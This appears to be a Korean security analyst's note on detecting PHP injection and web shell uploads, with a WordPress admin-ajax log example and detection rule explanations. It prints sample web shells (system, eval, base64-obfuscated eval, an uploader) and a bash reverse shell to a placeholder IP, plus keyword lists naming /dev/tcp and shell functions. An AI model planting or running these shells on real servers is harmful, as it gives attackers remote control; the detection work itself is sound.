## 🔮 *PHP Injection Attack*

* `<?php`, `<?=`, `shell_exec`, `system(`, `exec(`, `popen(`, `proc_open(`, `eval(`, `base64_decode`, `passthru(`
* 업로드 파일명: `*.php`, `*.phtml`, `*.phar`, `*.php5`, `file.php.jpg`, `shell.*`
* URL 파라미터: `?cmd=`, `?c=`, `?exec=`
* 명령어 키워드: `whoami`, `id`, `uname -a`, `ls -la`, `/bin/bash`, `/dev/tcp`

---

* 아주 단순한 커맨드 실행형

```php
<?php system($_GET['cmd']); ?>
```

* 출력 포맷 포함(탐지 회피·보기 좋게)

```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>"; } ?>
```

* 비밀번호로 접근 제어한 웹셸

```php
<?php if($_POST['pass']=='secret'){ eval($_POST['code']); } ?>
```

* `eval(base64_decode(...))` 형태(난독화)

```php
<?php @eval(base64_decode('ZG9lc19zb21lX2FjdGlvbg==')); ?>
```

* 파일 업로드·파일 관리자형(서버에 추가 파일 쓰기)

```php
<?php
if(isset($_FILES['f'])) {
  move_uploaded_file($_FILES['f']['tmp_name'], '/tmp/'.$_FILES['f']['name']);
  echo "ok";
}
?>
```

* 리버스/바인드 셸 실행 코드(심각)

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'"); ?>
```

* 기존 공개된 웹셸(예: c99, r57) 변형 — 길고 복잡한 함수·폼 포함


---
## 🚥Request 형식

* HTTP 요청 라인 / 엔드포인트:

```
POST /wp-admin/admin-ajax.php?action=wps_membership_csv_file_upload HTTP/1.1
```

* 헤더(특히 Content-Type, User-Agent, Referer)

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
User-Agent: Mozilla/5.0 (Python-requests/2.25.1)
```

* multipart `Content-Disposition` 에서 파일이름:

```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php
```

---
## 📌 CMD Injection + PHP Injection

```php
<?php echo md5("cmd"); ?>
```

| 이름                                                               | 탐지 대상                                  | 탐지 내용   |
| ---------------------------------------------------------------- | -------------------------------------- | ------- |
| CMD Injection Attack Detected (Common PHP Function Detected) v.1 | `<?php echo md5("cmd"); ?>` | `md5(`  |
| PHP Injection Attack (Opening Tag) v.1                           | `<?php echo md5("cmd"); ?>` | `<?php` |

<br>

### 🔍 CMD Injection Attack Detected (Common PHP Function Detected)

* PHP 코드 중 **명령어 실행 또는 문자열 조작**에 자주 쓰이는 함수 감지
* 특히 `md5(` 같은 함수는 **우회 체크나 해시 조작에 사용되는 흔한 패턴**
>  공격자가 **파라미터 이름에 PHP 코드**를 심어서 서버가 이를 처리하게 만들려는 시도

### 🛠️ PHP Injection Attack (Opening Tag)

* PHP 코드 인젝션 탐지
* 특히 `<?php` 태그는 PHP 코드의 시작을 의미하므로 **가장 명백한 인젝션 시그니처 중 하나**


---

## ☑️ 예제 1. 

```
https://blog.com/wp-admin/admin-ajax.php?action\=wps_membership_csv_file_upload<?php ?> <!DOCTYPE html> <html> <head> <title>Resultz</title> </head> <body><h1>Uploader</h1> <form enctype\=
```

* `<?php ?>`
PHP 코드 태그. 공격자가 업로드하려는 **빈 PHP 태그**(혹은 간단한 웹셸 코드가 들어갈 자리)를 로그에 넣어둔 것입니다. 이는 "PHP 실행 가능한 파일을 서버에 올리려 한다"는 강한 신호입니다.

* `<!DOCTYPE html> <html> <head> <title>Resultz</title> ... <form enctype\=`
HTML 폼 마크업(업로더 폼)을 보여줍니다. 공격자가 실제 업로드 폼을 렌더링/전송하려 했거나, 업로드 폼을 모사한 페이로드(파일 업로드 시퀀스)를 로그에 남긴 것일 수 있습니다.

* `admin-ajax.php?action=wps_membership_csv_file_upload` 
WordPress(또는 플러그인)의 AJAX 엔드포인트로, CSV 업로드 기능을 수행하는 액션인 듯합니다. 이 엔드포인트가 취약하면 파일을 받아 서버에 저장할 가능성이 있습니다.
`wps_membership_csv_file_upload` 라는 이름은 멤버십 플러그인 또는 커스텀 액션을 가리키고, 과거에 플러그인 업로드 취약점들이 종종 이런 경로에서 발생했습니다.

